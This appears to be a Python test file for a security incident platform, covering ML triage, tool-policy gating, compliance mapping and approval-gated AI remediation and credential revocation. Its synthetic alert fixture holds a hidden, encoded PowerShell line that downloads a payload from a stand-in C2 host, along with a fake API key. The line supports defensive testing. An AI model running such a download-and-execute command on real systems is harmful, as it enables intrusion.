"""
End-to-end API tests for the five commercial modules: MCP/API Security
Gateway, ML Prefilter, Compliance Mapper, Remediation Drafting Agent, and
Credential Exposure Response. Mirrors the style of
test_full_investigation_flow.py — real API calls against the test DB, not
mocked internals.
"""

DEMO_ALERT = {
    "source": "wazuh-synthetic",
    "alerts": [
        {
            "rule": {"id": "100301", "level": 15, "description": "Suspicious encoded PowerShell execution"},
            "agent": {"name": "WKSTN-TEST", "ip": "10.20.4.99"},
            "data": {"event_type": "process_creation"},
            "full_log": (
                "powershell.exe -nop -w hidden -enc SQBFAFgA "
                "DownloadString('http://evil-c2.badguy.net/payload.ps1') "
                "api_key: 'sk_live_abcdefghijklmnop123456'"
            ),
            "timestamp": "2026-09-05T09:14:07+00:00",
        }
    ],
}


def _ingest_and_approve_mitre(client):
    incident_id = client.post("/alerts", json=DEMO_ALERT).json()["incident_id"]
    mitre = client.post(f"/incidents/{incident_id}/mitre-suggestions").json()["suggestions"]
    assert mitre, "mock provider should produce at least one MITRE suggestion for this payload"
    powershell = next(s for s in mitre if s["technique_id"] == "T1059.001")
    review = client.post(
        f"/incidents/{incident_id}/review",
        json={
            "target_entity_type": "mitre_suggestion",
            "target_entity_id": powershell["id"],
            "decision": "approve",
            "comment": "confirmed",
        },
    )
    assert review.status_code == 200
    return incident_id


# --- ML Prefilter -----------------------------------------------------------


def test_ml_prefilter_labels_incident_on_ingest(client):
    incident_id = client.post("/alerts", json=DEMO_ALERT).json()["incident_id"]
    incident = client.get(f"/incidents/{incident_id}").json()
    assert incident["ml_triage_label"] in ("routine", "needs_review")
    assert 0.0 <= incident["ml_confidence"] <= 1.0


# --- MCP/API Security Gateway ------------------------------------------------


def test_tool_policies_seeded_and_admin_gated(client):
    # AUTH_SINGLE_USER_MODE=true in tests means require_role is a no-op, so
    # this just verifies the seeded defaults are reachable and correctly scoped.
    policies = client.get("/admin/tool-policies").json()
    by_name = {p["tool_name"]: p for p in policies}
    assert by_name["github"]["allowed_actions"] == ["create_pr"]
    assert by_name["secret_provider"]["allowed_actions"] == ["revoke"]


def test_tool_policy_update_and_reject(client):
    updated = client.put(
        "/admin/tool-policies/github", json={"allowed_actions": ["create_pr"], "scope": "narrowed"}
    ).json()
    assert updated["scope"] == "narrowed"

    # Remove all allowed actions -> any create-pr attempt should now be blocked.
    client.put("/admin/tool-policies/github", json={"allowed_actions": [], "scope": "locked down"})
    incident_id = _ingest_and_approve_mitre(client)
    draft = client.post(
        f"/incidents/{incident_id}/remediation-suggestions", json={"repo_full_name": "acme/webapp"}
    ).json()
    approve = client.post(
        f"/incidents/{incident_id}/review",
        json={
            "target_entity_type": "remediation_suggestion",
            "target_entity_id": draft["id"],
            "decision": "approve",
        },
    )
    assert approve.status_code == 200
    blocked = client.post(f"/incidents/{incident_id}/remediation-suggestions/{draft['id']}/create-pr")
    assert blocked.status_code == 400

    action_log = client.get("/admin/ai-action-log").json()
    assert any(e["tool_name"] == "github" and not e["allowed"] for e in action_log)

    # restore default for other tests in this session
    client.put(
        "/admin/tool-policies/github",
        json={"allowed_actions": ["create_pr"], "scope": "Pull-request creation only."},
    )


# --- Compliance Mapper --------------------------------------------------------


def test_compliance_mapping_and_coverage(client):
    incident_id = _ingest_and_approve_mitre(client)
    resp = client.post(f"/incidents/{incident_id}/compliance-mapping", json={"framework": "pci_dss"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["framework"] == "pci_dss"
    assert len(body["mappings"]) >= 1
    assert body["mappings"][0]["control_id"] == "10.2.1"

    report = client.get(f"/incidents/{incident_id}/compliance-report", params={"framework": "pci_dss"})
    assert report.status_code == 200
    assert len(report.json()) >= 1

    coverage = client.get("/compliance/coverage").json()
    assert "pci_dss" in coverage["coverage"]
    assert coverage["coverage"]["pci_dss"]["mapping_count"] >= 1


# --- Remediation Drafting Agent ------------------------------------------------


def test_remediation_lifecycle_requires_two_separate_approvals(client):
    incident_id = _ingest_and_approve_mitre(client)

    draft = client.post(
        f"/incidents/{incident_id}/remediation-suggestions", json={"repo_full_name": "acme/webapp"}
    ).json()
    assert draft["status"] == "pending"
    assert draft["pr_url"] is None

    # create-pr must be refused before approval
    too_early = client.post(f"/incidents/{incident_id}/remediation-suggestions/{draft['id']}/create-pr")
    assert too_early.status_code == 400

    approve = client.post(
        f"/incidents/{incident_id}/review",
        json={
            "target_entity_type": "remediation_suggestion",
            "target_entity_id": draft["id"],
            "decision": "approve",
        },
    )
    assert approve.status_code == 200

    created = client.post(f"/incidents/{incident_id}/remediation-suggestions/{draft['id']}/create-pr")
    assert created.status_code == 200
    body = created.json()
    assert body["status"] == "approved"
    assert body["pr_url"] is not None
    assert "mock" in body["pr_url"]


# --- Credential Exposure Response ---------------------------------------------


def test_secret_exposure_lifecycle_revoke_requires_approval(client):
    incident_id = client.post("/alerts", json=DEMO_ALERT).json()["incident_id"]

    alerts = client.post(f"/incidents/{incident_id}/secret-exposure").json()
    assert len(alerts) >= 1
    alert = alerts[0]
    assert "sk_live" not in alert["masked_value"]  # raw secret never returned
    assert alert["status"] == "pending"

    too_early = client.post(f"/incidents/{incident_id}/secret-exposure/{alert['id']}/revoke")
    assert too_early.status_code == 400

    approve = client.post(
        f"/incidents/{incident_id}/review",
        json={
            "target_entity_type": "secret_exposure_alert",
            "target_entity_id": alert["id"],
            "decision": "approve",
        },
    )
    assert approve.status_code == 200
    assert approve.json()["decision"] == "approve"

    revoked = client.post(f"/incidents/{incident_id}/secret-exposure/{alert['id']}/revoke")
    assert revoked.status_code == 200
    assert revoked.json()["status"] == "revoked"

    audit = client.get("/audit-logs", params={"target": f"secret_exposure_alert:{alert['id']}"}).json()
    assert any(a["action"] == "incident.secret_exposure.revoke" for a in audit)
